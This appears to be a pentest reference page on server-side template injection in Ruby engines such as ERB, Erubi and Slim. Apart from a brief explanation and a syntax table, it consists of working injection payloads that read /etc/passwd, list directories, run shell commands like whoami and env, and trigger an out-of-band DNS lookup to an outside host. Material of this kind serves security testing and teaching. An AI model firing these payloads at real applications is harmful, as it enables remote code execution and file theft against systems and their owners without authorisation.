# Server Side Template Injection - Ruby

> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Ruby, SSTI can occur when using templating engines like ERB (Embedded Ruby), Haml, liquid, or Slim, especially when user input is incorporated into templates without proper sanitization or validation.


## Summary

- [Templating Libraries](#templating-libraries)
- [Ruby](#ruby)
    - [Ruby - Basic injections](#ruby---basic-injections)
    - [Ruby - Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
    - [Ruby - List files and directories](#ruby---list-files-and-directories)
    - [Ruby - Remote Command execution](#ruby---remote-Command-execution)
- [References](#references)


## Templating Libraries

| Template Name | Payload Format |
| ------------ | --------- |
| Erb      | `<%= %>`   |
| Erubi    | `<%= %>`   |
| Erubis   | `<%= %>`   |
| HAML     | `#{ }`     |
| Liquid   | `{{ }}`    |
| Mustache | `{{ }}`    |
| Slim     | `#{ }`     |


## Ruby

### Ruby - Basic injections

**ERB**:

```ruby
<%= 7 * 7 %>
```

**Slim**:

```ruby
#{ 7 * 7 }
```

### Ruby - Retrieve /etc/passwd

```ruby
<%= File.open('/etc/passwd').read %>
```

### Ruby - List files and directories

```ruby
<%= Dir.entries('/') %>
```

### Ruby - Remote Command execution

Execute code using SSTI for **Erb**,**Erubi**,**Erubis** engine.

```ruby
<%=(`nslookup oastify.com`)%>
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

Execute code using SSTI for **Slim** engine.

```powershell
#{ %x|env| }
```


## References

* [Ruby ERB Template Injection - Scott White & Geoff Walton - September 13, 2017](https://web.archive.org/web/20181119170413/https://www.trustedsec.com/2017/09/rubyerb-template-injection/)